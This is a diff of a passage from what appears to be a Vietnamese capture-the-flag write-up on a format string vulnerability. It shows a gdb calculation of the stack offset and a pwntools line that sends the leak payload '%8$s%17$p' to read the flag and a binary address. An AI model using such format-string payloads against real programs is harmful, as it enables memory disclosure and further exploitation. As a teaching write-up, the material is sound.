@@ -121,10 +121,9 @@ Ngoài ra có thêm 2 lỗ hổng Format string.
 
 Nửa flag đầu có thể lấy từ Stack .Nhưng nửa sau nằm trong biến toàn cục yêu cầu cần có địa chỉ để truy cập. Trước tiên ta cần leak địa chỉ binary để tính base address.
 
-	# ((rsp+?)-rsp)/8+6
-	# p/d (0x7fffffffdee8-0x7fffffffde90)/8 +6
+Tính số % để đến ô chứa địa chỉ binary: `p/d (0x7fffffffdee8-0x7fffffffde90)/8 +6`
 	
-Dùng 
+Dùng %8
 
 	p.sendlineafter(b'Your name: ',b'%8$s%17$p')
 	
